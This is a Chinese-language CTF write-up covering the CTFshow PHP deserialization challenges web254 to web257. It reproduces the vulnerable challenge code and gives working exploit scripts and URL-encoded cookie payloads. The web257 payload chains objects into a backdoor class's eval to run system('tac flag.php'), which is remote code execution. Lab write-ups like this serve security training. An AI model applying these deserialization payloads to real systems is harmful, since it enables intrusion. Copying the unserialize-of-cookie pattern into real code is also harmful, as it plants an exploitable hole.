---
{"dg-publish":true,"title":"CTFshow_反序列化1","dg-path":"安全/靶场/CTFshow_反序列化1.md","permalink":"/安全/靶场/CTFshow_反序列化1/","dgPassFrontmatter":true}
---

```table-of-contents
```
# web254
```php
<?php  
  
error_reporting(0);  
highlight_file(__FILE__);  
include('flag.php');  
  
class ctfShowUser{  
    public $username='xxxxxx';  
    public $password='xxxxxx';  
    public $isVip=false;  
  
    public function checkVip(){  
        return $this->isVip;  
    }  
    public function login($u,$p){  
        if($this->username===$u&&$this->password===$p){            $this->isVip=true;  
        }  
        return $this->isVip;  
    }  
    public function vipOneKeyGetFlag(){  
        if($this->isVip){  
            global $flag;  
            echo "your flag is ".$flag;  
        }else{  
            echo "no vip, no flag";  
        }  
    }  
}  
  
$username=$_GET['username'];  
$password=$_GET['password'];  
  
if(isset($username) && isset($password)){    $user = new ctfShowUser();  
    if($user->login($username,$password)){  
        if($user->checkVip()){           
	        $user->vipOneKeyGetFlag();  
        }  
    }else{  
        echo "no vip,no flag";  
    }  
}
```

这个题还是很基础的，只要看懂代码逻辑就行了

读题顺序可以从结果往前推，首先注意到是需要调用`vipOneKeyGetFlag()`函数来输出flag，并且需要`isVip`为真，`isVip`默认值为假
然后去找哪里可以将`isVip`设置为真，注意到在`login`函数中，需要我们输入的内容与这个类中的`username`、`password`值相等即可
所以答案也就很显而易见了
```
?username=xxxxxx&password=xxxxxx
```



# web255

```php
<?php  
    
error_reporting(0);  
highlight_file(__FILE__);  
include('flag.php');  
  
class ctfShowUser{  
    public $username='xxxxxx';  
    public $password='xxxxxx';  
    public $isVip=false;  
  
    public function checkVip(){  
        return $this->isVip;  
    }  
    public function login($u,$p){  
        return $this->username===$u&&$this->password===$p;  
    }  
    public function vipOneKeyGetFlag(){  
        if($this->isVip){  
            global $flag;  
            echo "your flag is ".$flag;  
        }else{  
            echo "no vip, no flag";  
        }  
    }  
}  
  
$username=$_GET['username'];  
$password=$_GET['password'];  
  
if(isset($username) && isset($password)){    $user = unserialize($_COOKIE['user']);      
    if($user->login($username,$password)){  
        if($user->checkVip()){            
        $user->vipOneKeyGetFlag();  
        }  
    }else{  
        echo "no vip,no flag";  
    }  
}
```

这一题也比较基础，要点在于`$user = unserialize($_COOKIE['user']);`
并且原本的代码逻辑中也没有将`isVip`修改为1的方法，所以我们也就得自己传进去一个`isVip`为1的对象

要构造这个序列化，只要将原本的类放进我们本地的php运行器中序列化运行一下即可，类中的方法可以去掉不会影响
```php
<?php  
class ctfShowUser{  
    public $username='xxxxxx';  
    public $password='xxxxxx';  
    public $isVip=true;  
}  
echo urlencode(serialize(new ctfShowUser()));  
?>
```
注意这里是利用cookie传进去的数据，要进行一次url编码

得到数据：
```
O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D
```

我们将其放进请求头中即可
![Pasted image 20240929224700.png](/img/user/picture/Pasted%20image%2020240929224700.png)

# web256



```php
<?php  
  
error_reporting(0);  
highlight_file(__FILE__);  
include('flag.php');  
  
class ctfShowUser{  
    public $username='xxxxxx';  
    public $password='xxxxxx';  
    public $isVip=false;  
  
    public function checkVip(){  
        return $this->isVip;  
    }  
    public function login($u,$p){  
        return $this->username===$u&&$this->password===$p;  
    }  
    public function vipOneKeyGetFlag(){  
        if($this->isVip){  
            global $flag;  
            if($this->username!==$this->password){  
                    echo "your flag is ".$flag;  
              }  
        }else{  
            echo "no vip, no flag";  
        }  
    }  
}  
  
$username=$_GET['username'];  
$password=$_GET['password'];  
  
if(isset($username) && isset($password)){    $user = unserialize($_COOKIE['user']);      
    if($user->login($username,$password)){  
        if($user->checkVip()){            $user->vipOneKeyGetFlag();  
        }  
    }else{  
        echo "no vip,no flag";  
    }  
}
```

这一题比上一题多了一个条件就是user中的username和password不能相等，所以我们构造序列化的时候修改一下就可以了

```php
<?php  
class ctfShowUser{  
    public $username='111';  
    public $password='222';  
    public $isVip=true;  
}  
echo urlencode(serialize(new ctfShowUser()));  
?>
```

得到数据：
```txt
O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A3%3A%22111%22%3Bs%3A8%3A%22password%22%3Bs%3A3%3A%22222%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D
```

构造payload
![Pasted image 20241006120754.png](/img/user/picture/Pasted%20image%2020241006120754.png)




# web257

```php
<?php  
  
error_reporting(0);  
highlight_file(__FILE__);  
  
class ctfShowUser{  
    private $username='xxxxxx';  
    private $password='xxxxxx';  
    private $isVip=false;  
    private $class = 'info';  
  
    public function __construct(){        
    $this->class=new info();  
    }  
    public function login($u,$p){  
        return $this->username===$u&&$this->password===$p;  
    }  
    public function __destruct(){        
    $this->class->getInfo();  
    }  
  
}  
  
class info{  
    private $user='xxxxxx';  
    public function getInfo(){  
        return $this->user;  
    }  
}  
  
class backDoor{  
    private $code;  
    public function getInfo(){  
        eval($this->code);  
    }  
}  
  
$username=$_GET['username'];  
$password=$_GET['password'];  
  
if(isset($username) && isset($password)){   
   $user = unserialize($_COOKIE['user']);    
   $user->login($username,$password);  
}
```

这一题的思路就是通过cookie传入一个`ctfShowUser`类，在这个类中多了一个变量`$class`,这个在代码中的预计功能是一个类`info`, 而在这个类结束的时候会执行变量class中的`getInfo()`

关键就在于这段代码中有一个类`backDoor`,这其中有一个函数也叫`getInfo`,而且还可以进行RCE代码执行

所以我们可以构造:
```php
<?php  
class ctfShowUser{  
    private $username='xxxxxx';  
    private $password='xxxxxx';  
    private $isVip=false;  
    private $class = 'info';  
  
    public function __construct(){  
        $this->class=new backDoor();  
    }  
  
}  
  
class backDoor{  
    private $code='system("tac flag.php");';  
}  
  
echo "user=".urlencode(serialize(new ctfShowUser()))."<br>";  
?>
```


得到payload：
```txt
user=O%3A11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A21%3A%22%00ctfShowUser%00username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A21%3A%22%00ctfShowUser%00password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A18%3A%22%00ctfShowUser%00isVip%22%3Bb%3A0%3Bs%3A18%3A%22%00ctfShowUser%00class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A14%3A%22%00backDoor%00code%22%3Bs%3A23%3A%22system%28%22tac+flag.php%22%29%3B%22%3B%7D%7D
```
![Pasted image 20241007214334.png](/img/user/picture/Pasted%20image%2020241007214334.png)


得到flag
![Pasted image 20241007214350.png](/img/user/picture/Pasted%20image%2020241007214350.png)





